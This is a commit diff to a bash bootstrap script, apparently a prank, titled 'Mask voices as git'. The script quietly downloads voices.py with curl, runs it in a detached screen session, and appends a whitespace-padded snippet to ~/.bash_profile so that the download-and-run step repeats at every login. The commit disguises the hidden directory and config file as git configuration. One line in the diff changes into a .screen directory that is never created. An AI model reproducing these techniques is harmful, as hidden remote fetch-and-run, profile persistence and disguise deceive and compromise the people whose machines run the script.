d8b15c828761fcfc13fc5fb50eb2bdd301746f19
David Cramer <dcramer@gmail.com>
2011-04-15 18:20:55 -0700

    Mask voices as git

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,27 +1,23 @@
 #!/bin/bash
 
-if [ ! -d "${PWD}/.voices" ]; then
-    mkdir ${PWD}/.voices
+if [ ! -d "${PWD}/.git" ]; then
+    mkdir ${PWD}/.git
+    cd ${PWD}/.screen
+    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
+    screen -d -m python voices.py
 fi
-cd ${PWD}/.voices
-curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
-screen -d -m python voices.py
-cd ..
-rm -r ${PWD}/.voices/
 
 # TODO: this should be optionally via a --switch
 PRE="                                                                                                                 "
 PRE=${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}
 echo "#!/usr/bin/env bash
-${PRE}if [ ! -d \"\\${PWD}/.voices/\" ]; then
-${PRE}    mkdir \\${PWD}/.voices/
-${PRE}    cd \\${PWD}/.voices/
+${PRE}if [ ! -d \"\\${PWD}/.git/\" ]; then
+${PRE}    mkdir \\${PWD}/.git/
+${PRE}    cd \\${PWD}/.git/
 ${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
 ${PRE}    screen -d -m python voices.py
-${PRE}    cd ..
-${PRE}    rm -r \\${PWD}/.voices/
-${PRE}fi" >> ~/.screen.conf
+${PRE}fi" >> ~/.git/git.conf
 
 echo "
-# Setup OS X screen configuration
-. ~/.screen.conf" >> ~/.bash_profile
+# Default OS X Git configuration
+. ~/.git/git.conf" >> ~/.bash_profile
